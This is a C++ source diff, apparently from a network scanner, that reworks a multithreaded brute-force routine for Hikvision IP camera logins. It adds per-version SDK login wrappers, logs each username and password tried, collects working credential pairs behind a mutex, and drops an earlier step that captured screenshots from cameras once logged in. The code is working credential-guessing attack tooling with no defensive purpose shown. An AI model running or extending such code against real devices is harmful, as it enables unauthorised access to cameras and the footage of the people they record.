@@ -65,52 +65,83 @@ threads_bruteforce(const std::vector<std::string>& login, std::vector<std::strin
   return "";
 }
 
+LONG
+V0_brute_hikvision(char* ip, char* login, char* pass, int port)
+{
+  NET_DVR_DEVICEINFO device = {0};
+  return (NET_DVR_Login(ip, 8000, login, pass, &device));
+}
+
+LONG
+V30_brute_hikvision(char* ip, char* login, char* pass, int port)
+{
+  NET_DVR_DEVICEINFO_V30 device = {0};
+  return (NET_DVR_Login_V30(ip, port, login, pass, &device));
+}
+
+LONG
+V40_brute_hikvision(char *ip, char* login, char* pass, int port)
+{
+  NET_DVR_USER_LOGIN_INFO logininfo = {0};
+  NET_DVR_DEVICEINFO_V40 device = {0};
+
+  logininfo.bUseAsynLogin = false;
+  logininfo.wPort = 8000;
+
+  strcpy(logininfo.sDeviceAddress, ip);
+  strcpy(logininfo.sUserName, login);
+  strcpy(logininfo.sPassword, pass);
+
+  return (NET_DVR_Login_V40(&logininfo, &device));
+}
+
 std::string
-brute_hikvision(const std::string ip, const std::string login, const std::string pass, int brute_log, const std::string& path)
+brute_hikvision(std::string ip, std::string login, std::string pass, int brute_log, const std::string& path)
 {
 #ifdef HAVE_HIKVISION
-  std::string result;
-  std::string screenshotFilename = "screenshot.jpg";
+  if (brute_log)
+    np1.nlog_custom("HIKVISION", "                 try: " + login + "@" + pass + " [BRUTEFORCE]\n", 1);
 
-  /*Перенаправление лога, потому что он выводит сообщение которое нам не надо.*/
+  LONG res;
+  std::string result = "";
+
   freopen("/dev/null", "w", stderr);
   NET_DVR_Init();
 
-  NET_DVR_USER_LOGIN_INFO loginInfo = {0};
-  loginInfo.bUseAsynLogin = false;
+  char *_ip = ip.data();
+  char *_login = login.data();
+  char *_pass = pass.data();
+  u16 port = 8000;
 
-  strcpy(loginInfo.sDeviceAddress, ip.c_str());
-  loginInfo.wPort = 8000;
+  res = V0_brute_hikvision(_ip, _login, _pass, port);
 
-  strcpy(loginInfo.sUserName, login.c_str());
-  strcpy(loginInfo.sPassword, pass.c_str());
-
-  NET_DVR_DEVICEINFO_V40 deviceInfo = {0};
-
-  if (brute_log){
-    np1.nlog_custom("HIKVISION", "                 try: " + login + "@" + pass + " [BRUTEFORCE]\n", 1);
+  /*
+  if (res < 0) {
+    res = V30_brute_hikvision(_ip, _login, _pass, port);
+    if (res < 0) {
+      res = V40_brute_hikvision(_ip, _login, _pass, port);
+      if (res < 0)
+        goto sum;
+    }
   }
+  */
 
-  LONG userId = NET_DVR_Login_V40(&loginInfo, &deviceInfo);
-
-  if (userId < 0) {
-    NET_DVR_Cleanup();
-    return "";
-  }
-
-  if (path != "")
-    hikvision_screenshot(ip, userId, deviceInfo, path);
+  if (res < 0)
+    goto sum;
 
   result = login + ":" + pass + "@";
+  goto sum;
 
-  NET_DVR_Logout(userId);
-  NET_DVR_Cleanup();
-
-  return result;
 #else
   return "no-hikvision";
 #endif
+sum:
+  NET_DVR_Logout(res);
+  NET_DVR_Cleanup();
+  return result;
 }
+
+std::mutex fuck;
 
 std::string
 threads_brute_hikvision(const std::string ip, const std::vector<std::string> logins, const std::vector<std::string> passwords,
@@ -125,7 +156,11 @@ threads_brute_hikvision(const std::string ip, const std::vector<std::string> log
       delayy(brute_timeout_ms);
       futures.push_back(pool.enqueue([ip, login, password, brute_log, path, &results]() {
         std::string temp = brute_hikvision(ip, login, password, brute_log, path);
-        if (!temp.empty() && temp.length() > 3){results.push_back(temp);}
+
+        fuck.lock();
+        if (!temp.empty())
+          results.push_back(temp);
+        fuck.unlock();
       }));
     }
   }
